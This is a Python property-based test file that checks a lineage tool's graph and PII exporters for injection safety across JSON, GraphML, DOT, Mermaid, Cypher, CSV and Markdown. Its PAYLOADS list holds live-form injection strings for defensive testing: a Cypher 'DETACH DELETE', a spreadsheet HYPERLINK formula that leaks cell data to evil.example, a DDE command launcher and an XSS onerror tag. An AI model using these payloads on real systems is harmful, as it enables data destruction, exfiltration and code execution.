"""Property tests: every exporter's output re-parses and is injection-free (design 14).

Names and IDs are arbitrary text, mixed with the payloads from LP-auw, LP-aml and
LP-l1s. Each format is parsed back, and every value must come back exactly as it went
in (less what the format cannot carry), with the structure unchanged.
"""

from __future__ import annotations

import csv
import io
import json
import re
from xml.etree import ElementTree as ET

import pydot
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from lineagepilot_core.analysis.pii import PIIBasis, PIIIndex, PIIIndicator
from lineagepilot_core.export import pii_inventory_csv, pii_inventory_markdown
from lineagepilot_core.export.escape import csv_cell, xml_text
from lineagepilot_core.export.graph import (
    ExportEdge,
    ExportNode,
    GraphView,
    to_cypher,
    to_dot,
    to_graphml,
    to_json,
    to_mermaid,
)
from lineagepilot_core.graph.model import Column, Confidence, MetadataGraph, Node, NodeKind

PAYLOADS = [
    'x"}) RETURN 1; MATCH (n) DETACH DELETE n; MATCH (a {urn: "y',  # LP-auw
    '</data></node><node id="evil"><data key="n_name">pwned</data>',  # LP-l1s GraphML
    '"]; evil [label="x"]; n0 -> evil; x [label="',  # LP-l1s DOT
    "a\nclick n0 call alert(1)\n%%{init: {'theme': 'dark'}}%%",  # LP-l1s Mermaid
    '=HYPERLINK("http://evil.example/?"&A1, "click")',  # LP-aml CSV
    "<img src=x onerror=alert(1)>",  # LP-aml HTML
    "|col|another| ![x](http://evil)",
    "\\N\\G\\l back\\slashes\\",
    "\x00\x07\x1b control ퟿ \U0001f600 ￾",
    "-cmd|' /C calc'!A0",
    "@SUM(1+1)",
    "\t\rtab and cr",
]

text = st.one_of(st.sampled_from(PAYLOADS), st.text(max_size=30))
KINDS = ["model", "seed", "source", "exposure", "column", "airflow_task", "relation"]
EDGE_KINDS = ["depends_on", "derives", "materialises", "orchestrates", "has_column", "weird"]


@st.composite
def views(draw) -> GraphView:
    ids = draw(st.lists(text, min_size=1, max_size=8, unique=True))
    nodes = [
        ExportNode(
            id=node_id,
            kind=draw(st.sampled_from(KINDS)),
            name=draw(text),
            layer=draw(st.none() | text),
            domain=draw(st.none() | text),
            owner=draw(st.none() | text),
            file_path=draw(st.none() | text),
        )
        for node_id in ids
    ]
    edges = [
        ExportEdge(
            kind=draw(st.sampled_from(EDGE_KINDS)),
            upstream=draw(st.sampled_from(ids)),
            downstream=draw(st.sampled_from(ids)),
            confidence=draw(st.sampled_from(["declared", "inferred", "heuristic"])),
            transformation=draw(st.none() | text),
        )
        for _ in range(draw(st.integers(0, 10)))
    ]
    return GraphView(nodes, edges)


PROPERTY = settings(max_examples=200, deadline=None, suppress_health_check=[HealthCheck.too_slow])


@PROPERTY
@given(views())
def test_json_round_trips(view):
    data = json.loads(to_json(view))
    assert [n["id"] for n in data["nodes"]] == [n.id for n in view.nodes]
    assert [n["name"] for n in data["nodes"]] == [n.name for n in view.nodes]
    assert [(e["upstream"], e["downstream"]) for e in data["edges"]] == [
        (e.upstream, e.downstream) for e in view.edges
    ]


@PROPERTY
@given(views())
def test_graphml_parses_and_keeps_every_value(view):
    ns = {"g": "http://graphml.graphdrawing.org/xmlns"}
    root = ET.fromstring(to_graphml(view))
    nodes = root.findall("g:graph/g:node", ns)
    assert [n.get("id") for n in nodes] == [xml_text(n.id) for n in view.nodes]
    for element, node in zip(nodes, view.nodes, strict=True):
        name = element.find("g:data[@key='n_name']", ns).text or ""
        assert name == xml_text(node.name)
    edges = root.findall("g:graph/g:edge", ns)
    assert [(e.get("source"), e.get("target")) for e in edges] == [
        (xml_text(e.upstream), xml_text(e.downstream)) for e in view.edges
    ]


def _dot_unquote(value: str) -> str:
    assert value.startswith('"') and value.endswith('"'), value
    out, i, body = [], 0, value[1:-1]
    while i < len(body):
        if body[i] == "\\":
            nxt = body[i + 1]
            out.append({"n": "\n"}.get(nxt, nxt))
            i += 2
        else:
            out.append(body[i])
            i += 1
    return "".join(out)


def _dot_normalise(value: str) -> str:
    return value.replace("\r\n", "\n").replace("\r", "\n")


@PROPERTY
@given(views())
def test_dot_parses_with_the_same_nodes_labels_and_edges(view):
    (graph,) = pydot.graph_from_dot_data(to_dot(view))
    nodes = {}
    for cluster in graph.get_subgraphs():
        for node in cluster.get_nodes():
            nodes[node.get_name()] = node
    assert len(nodes) == len(view.nodes)
    for index, node in enumerate(view.nodes):
        parsed = nodes[f"n{index}"]
        assert _dot_unquote(parsed.get("label")) == _dot_normalise(node.name)
        assert _dot_unquote(parsed.get("tooltip")) == _dot_normalise(node.id)
    ids = {node.id: f"n{i}" for i, node in enumerate(view.nodes)}
    # pydot groups parallel edges, so compare as multisets
    assert sorted((e.get_source(), e.get_destination()) for e in graph.get_edges()) == sorted(
        (ids[e.upstream], ids[e.downstream]) for e in view.edges
    )


_MERMAID_LABEL = r'"(?:[A-Za-z0-9 _.,:/()\-]|#\d+;)*"'
_MERMAID_LINES = [
    re.compile(r"flowchart LR"),
    re.compile(rf"  subgraph s\d+\[{_MERMAID_LABEL}\]"),
    re.compile(
        rf"    n\d+(?:\[{_MERMAID_LABEL}\]|\[\({_MERMAID_LABEL}\)\]|\{{\{{{_MERMAID_LABEL}\}}\}}"
        rf"|\[\[{_MERMAID_LABEL}\]\]|>{_MERMAID_LABEL}\])"
    ),
    re.compile(r"  end"),
    re.compile(r"  n\d+ (?:-->|-\.->|---) n\d+"),
]


def _mermaid_decode(label: str) -> str:
    return re.sub(r"#(\d+);", lambda m: chr(int(m.group(1))), label[1:-1])


@PROPERTY
@given(views())
def test_mermaid_lines_follow_the_grammar_and_labels_decode(view):
    output = to_mermaid(view)
    lines = output.splitlines()
    for line in lines:
        assert any(p.fullmatch(line) for p in _MERMAID_LINES), line
    node_lines = [line for line in lines if line.startswith("    n")]
    assert len(node_lines) == len(view.nodes)
    labels = {}
    for line in node_lines:
        node_id = re.match(r"    (n\d+)", line).group(1)
        labels[node_id] = _mermaid_decode(re.search(_MERMAID_LABEL, line).group(0))
    for index, node in enumerate(view.nodes):
        assert labels[f"n{index}"] == node.name
    assert len([line for line in lines if re.fullmatch(_MERMAID_LINES[-1], line)]) == len(
        view.edges
    )


_CYPHER_STRING = r'"(?:[^"\\\n]|\\.)*"'
_CYPHER_PROPS = rf"(?:[a-z_]+: {_CYPHER_STRING})(?:, [a-z_]+: {_CYPHER_STRING})*"
_CYPHER_STATEMENTS = [
    re.compile(
        r"CREATE CONSTRAINT lineagepilot_id IF NOT EXISTS FOR \(n:LineagePilot\) "
        r"REQUIRE n\.id IS UNIQUE;"
    ),
    re.compile(
        rf"MERGE \(n:LineagePilot \{{id: {_CYPHER_STRING}\}}\) "
        rf"SET n:[A-Z][A-Za-z]+, n \+= \{{(?:{_CYPHER_PROPS})?\}};"
    ),
    re.compile(
        rf"MATCH \(a:LineagePilot \{{id: {_CYPHER_STRING}\}}\), "
        rf"\(b:LineagePilot \{{id: {_CYPHER_STRING}\}}\) "
        rf"MERGE \(a\)-\[:[A-Z_]+ \{{{_CYPHER_PROPS}\}}\]->\(b\);"
    ),
]


@PROPERTY
@given(views())
def test_cypher_statements_follow_the_template_and_literals_decode(view):
    """LP-auw: no value can end a string literal and start a statement."""
    output = to_cypher(view)
    lines = output.splitlines()
    for line in lines:
        assert any(p.fullmatch(line) for p in _CYPHER_STATEMENTS), line
    literals = [json.loads(s) for line in lines for s in re.findall(_CYPHER_STRING, line)]
    expected_values = {n.id for n in view.nodes} | {
        v
        for n in view.nodes
        for v in (n.name, n.layer, n.domain, n.owner, n.file_path)
        if v is not None
    }
    expected_values |= {e.confidence for e in view.edges} | {
        e.transformation for e in view.edges if e.transformation is not None
    }
    assert set(literals) <= expected_values
    known_kinds = {"model", "seed", "source", "exposure", "column", "airflow_task", "relation"}
    assert len([line for line in lines if line.startswith("MERGE (n:")]) == len(
        [n for n in view.nodes if n.kind in known_kinds]
    )


@st.composite
def pii_graphs(draw) -> tuple[MetadataGraph, PIIIndex]:
    graph = MetadataGraph()
    index = PIIIndex()
    for i, name in enumerate(draw(st.lists(text, min_size=1, max_size=6))):
        node_id = f"model.p.m{i}"
        graph.add_node(Node(node_id, NodeKind.MODEL, f"m{i}", layer=draw(st.none() | text)))
        column_id = f"{node_id}#{name}"
        graph.add_column(Column(column_id, node_id, name))
        index.indicators[column_id] = PIIIndicator(
            column=column_id,
            node_id=node_id,
            pii_types=(draw(text),),
            basis=draw(st.sampled_from(list(PIIBasis))),
            confidence=Confidence.HEURISTIC,
            origins=tuple(draw(st.lists(text, max_size=2))),
        )
    index.unknown = {"model.p.m0": draw(text)}
    return graph, index


@PROPERTY
@given(pii_graphs())
def test_pii_csv_round_trips_with_formulas_neutralised(data):
    """LP-aml: a cell starting with = + - @ TAB or CR never reaches a spreadsheet live."""
    graph, index = data
    rows = list(csv.reader(io.StringIO(pii_inventory_csv(graph, index))))
    assert len(rows) == len(index.indicators) + 1
    for row, indicator in zip(rows[1:], index.indicators.values(), strict=True):
        for cell in row:
            assert not cell.startswith(("=", "+", "-", "@", "\t", "\r"))
        assert row[1] == csv_cell(indicator.column.partition("#")[2])
        assert "\x00" not in "".join(row)


@PROPERTY
@given(pii_graphs())
def test_pii_markdown_rows_keep_their_shape(data):
    graph, index = data
    output = pii_inventory_markdown(graph, index)
    table = [line for line in output.splitlines() if line.startswith("| model.")]
    assert len(table) == len(index.indicators)
    for line in table:
        cells = re.split(r"(?<!\\)\|", line)[1:-1]
        assert len(cells) == 7, line
    assert "<" not in output and "\r" not in output
    assert not re.search(r"(?<!\\)\]\(", output)  # no live links
